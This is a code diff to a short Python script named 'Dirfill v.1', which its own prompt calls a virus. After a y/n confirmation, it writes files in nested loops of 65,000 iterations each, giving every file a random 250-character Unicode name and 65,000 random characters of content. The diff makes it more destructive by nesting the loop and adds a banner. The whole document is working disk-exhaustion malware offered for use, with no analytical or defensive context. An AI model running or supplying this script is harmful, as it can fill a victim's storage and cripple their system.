@@ -1,8 +1,16 @@
 import os, time, random
 
-
+os.system("title Dirfill v.1")
 while True:
     os.system("color 7 & cls")
+    print("""
+  _____  _____  _____   ______  _____  _       _       __      __ __    __ 
+ |  __ \|_   _||  __ \ |  ____||_   _|| |     | |      \ \    / //_ |  /_ |
+ | |  | | | |  | |__) || |__     | |  | |     | |       \ \  / /  | |   | |
+ | |  | | | |  |  _  / |  __|    | |  | |     | |        \ \/ /   | |   | |
+ | |__| |_| |_ | | \ \ | |      _| |_ | |____ | |____     \  /    | | _ | |
+ |_____/|_____||_|  \_\|_|     |_____||______||______|     \/     |_|(_)|_|               
+    """)
     confirm = input("Are you sure you want to execute the virus? I am not responsible for any consequences (y/n)\n> ")
     if confirm.lower() == "y":
         break;
@@ -13,7 +21,6 @@ while True:
         time.sleep(3)
 def get_random_unicode(length):
     get_char = chr
-    # Update this to include code point ranges to be sampled
     include_ranges = [
         ( 0x0021, 0x0021 ),
         ( 0x0023, 0x0026 ),
@@ -34,5 +41,7 @@ def get_random_unicode(length):
             for code_point in range(current_range[0], current_range[1])
     ]
     return ''.join(random.choice(alphabet) for i in range(length))
+
 for i in range(65000):
-    open(f"{get_random_unicode(250)}", "x", encoding="utf-8").write(str(get_random_unicode(65000)))
+    for i in range(65000):
+        open(f"{get_random_unicode(250)}", "x", encoding="utf-8").write(str(get_random_unicode(65000)))
